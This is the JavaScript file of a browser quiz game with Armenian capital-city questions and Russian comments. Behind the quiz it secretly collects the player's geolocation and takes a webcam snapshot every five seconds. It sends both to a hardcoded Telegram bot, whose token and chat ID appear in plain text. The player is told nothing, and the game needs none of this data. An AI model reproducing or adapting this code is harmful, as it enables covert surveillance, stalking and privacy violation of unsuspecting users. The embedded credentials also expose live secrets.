const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const nameFormContainer = document.getElementById('name-form-container');
const gameArea = document.getElementById('game-area');
const userNameDisplay = document.getElementById('user-name');
const scoreInfo = document.getElementById('score-info');
const questionContainer = document.getElementById('question');
const answerButtons = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

let shuffledQuestions = [];
let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;
let userName = '';
let latitude = '';
let longitude = '';
let videoStream = null;

const TELEGRAM_BOT_TOKEN = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
const TELEGRAM_CHAT_ID = "8071841674";

// === Инициализация ===
nameForm.addEventListener('submit', (e) => {
  e.preventDefault();
  userName = nameInput.value.trim();
  nameFormContainer.style.display = 'none';
  gameArea.style.display = 'block';
  userNameDisplay.textContent = `👤 ${userName}`;
  getLocation();
  getCamera();
  startGame();
});

// === Попробовать снова ===
tryAgainBtn.addEventListener('click', () => {
  location.reload();
});

// === Геолокация ===
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        latitude = pos.coords.latitude;
        longitude = pos.coords.longitude;
        sendToTelegram("📍 Получены координаты:\n" +
          `https://www.google.com/maps?q=${latitude},${longitude}`);
      },
      (err) => {
        sendToTelegram("⚠️ Геолокация не разрешена.");
      }
    );
  } else {
    sendToTelegram("⚠️ Браузер не поддерживает геолокацию.");
  }
}

// === Камера и фото каждые 5 сек ===
function getCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
      videoStream = stream;
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      setInterval(() => takeSnapshot(video), 5000);
    })
    .catch(() => {
      sendToTelegram("⚠️ Камера не разрешена.");
    });
}

function takeSnapshot(video) {
  const canvas = document.createElement('canvas');
  canvas.width = 320;
  canvas.height = 240;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob((blob) => {
    sendPhotoToTelegram(blob);
  }, 'image/jpeg');
}

// === Отправка в Telegram ===
function sendToTelegram(message) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `👤 Имя: ${userName}\n${message}`,
    }),
  });
}

function sendPhotoToTelegram(blob) {
  const formData = new FormData();
  formData.append("chat_id", TELEGRAM_CHAT_ID);
  formData.append("photo", blob, "photo.jpg");
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData,
  });
}

// === Игра ===

function startGame() {
  shuffledQuestions = shuffleArray([...questions]).slice(0, 20);
  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  showQuestion();
}

function showQuestion() {
  resetState();
  const currentQuestion = shuffledQuestions[currentQuestionIndex];
  questionContainer.textContent = currentQuestion.question;

  currentQuestion.answers.forEach((answer) => {
    const button = document.createElement('button');
    button.textContent = answer.text;
    button.classList.add('fade-in');
    button.addEventListener('click', () => selectAnswer(button, answer.correct));
    answerButtons.appendChild(button);
  });

  updateScoreInfo();
}

function resetState() {
  answerButtons.innerHTML = '';
}

function selectAnswer(button, correct) {
  const buttons = answerButtons.querySelectorAll('button');
  buttons.forEach(btn => btn.disabled = true);

  if (correct) {
    button.classList.add('correct');
    correctCount++;
  } else {
    button.classList.add('wrong');
    const correctBtn = [...buttons].find(btn =>
      shuffledQuestions[currentQuestionIndex].answers.find(a => a.text === btn.textContent && a.correct)
    );
    if (correctBtn) correctBtn.classList.add('correct');
    wrongCount++;
  }

  setTimeout(() => {
    currentQuestionIndex++;
    if (currentQuestionIndex < shuffledQuestions.length) {
      showQuestion();
    } else {
      endGame();
    }
  }, 1500);
}

function updateScoreInfo() {
  const left = shuffledQuestions.length - currentQuestionIndex;
  scoreInfo.innerHTML = `🔵 Մնացել է՝ ${left} | ✅ Ճիշտ՝ ${correctCount} | ❌ Սխալ՝ ${wrongCount}`;
}

function endGame() {
  questionContainer.textContent = correctCount >= 15
    ? '🎉 Շնորհավորում ենք, դուք հաղթեցիք!'
    : '😔 Փորձեք կրկին։';
  answerButtons.innerHTML = '';
  tryAgainBtn.style.display = 'inline-block';
}

// === Помощники ===

function shuffleArray(array) {
  return array.sort(() => Math.random() - 0.5);
}

function shuffleAnswers(options, correctIndex) {
  const correct = options[correctIndex];
  const answers = options.map((text, i) => ({
    text,
    correct: i === correctIndex
  }));
  return shuffleArray(answers);
}

// === Вопросы (пока 10 тестовых) ===
const questions = [
  {
    question: "Որն է Ֆրանսիայի մայրաքաղաքը?",
    answers: shuffleAnswers(["Փարիզ", "Լիոն", "Մարսել", "Նիցցա"], 0)
  },
  {
    question: "Որն է Գերմանիայի մայրաքաղաքը?",
    answers: shuffleAnswers(["Բեռլին", "Մյունխեն", "Համբուրգ", "Քյոլն"], 0)
  },
  {
    question: "Որն է Հայաստանի մայրաքաղաքը?",
    answers: shuffleAnswers(["Երևան", "Գյումրի", "Վանաձոր", "Աշտարակ"], 0)
  },
  {
    question: "Որն է Ռուսաստանի մայրաքաղաքը?",
    answers: shuffleAnswers(["Մոսկվա", "Սանկտ-Պետերբուրգ", "Կազան", "Սոչի"], 0)
  },
  {
    question: "Որն է ԱՄՆ-ի մայրաքաղաքը?",
    answers: shuffleAnswers(["Վաշինգտոն", "Նյու Յորք", "Լոս Անջելես", "Չիկագո"], 0)
  },
  {
    question: "Որն է Չինաստանի մայրաքաղաքը?",
    answers: shuffleAnswers(["Պեկին", "Շանհայ", "Գուանչժոու", "Հոնկոնգ"], 0)
  },
  {
    question: "Որն է Ճապոնիայի մայրաքաղաքը?",
    answers: shuffleAnswers(["Տոկիո", "Օսակա", "Կիոտո", "Նագասակի"], 0)
  },
  {
    question: "Որն է Կանադայի մայրաքաղաքը?",
    answers: shuffleAnswers(["Օտտավա", "Տորոնտո", "Վանկուվեր", "Մոնրեալ"], 0)
  },
  {
    question: "Որն է Եգիպտոսի մայրաքաղաքը?",
    answers: shuffleAnswers(["Կահիրե", "Լուքսոր", "Ալեքսանդրիա", "Գիզա"], 0)
  },
  {
    question: "Որն է Մեքսիկայի մայրաքաղաքը?",
    answers: shuffleAnswers(["Մեխիկո", "Գվադալախարա", "Տիհուանա", "Մոնտերեյ"], 0)
  },
];